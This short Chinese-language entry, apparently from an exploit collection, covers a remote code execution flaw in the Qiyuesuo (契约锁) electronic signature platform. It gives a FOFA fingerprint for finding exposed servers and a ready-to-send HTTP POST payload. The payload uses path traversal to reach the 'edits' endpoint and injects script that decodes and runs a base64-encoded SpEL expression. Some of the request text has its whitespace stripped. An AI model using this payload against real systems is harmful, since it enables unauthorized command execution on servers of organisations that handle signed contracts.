# 契约锁电子签章平台edits远程代码执行漏洞

契约锁电子签章平台edits远程 ｜ 命令执行 ｜ —
- **指纹**：`app="契约锁-电子签署平台"`

**Payload**
```
POST/contract/ukeysign/.%2e/.%2e/template/param/edits HTTP/1.1
Host:
AppleWebKit/537.36(KHTML,likeGecko)Chrome/113.0.0.0Safari/537.36
Content-Type:application/json
{"id":"2","params":[{"expression":"vara=new
org.springframework.expression.spel.standard.SpelExpressionParser();var
b='SpEL表达式的base64编码';varb64=java.util.Base64.getDecoder();var
deStr=newjava.lang.String(b64.decode(b),'UTF-8');var
c=a.parseExpression(deStr);c.getValue();"}]}
```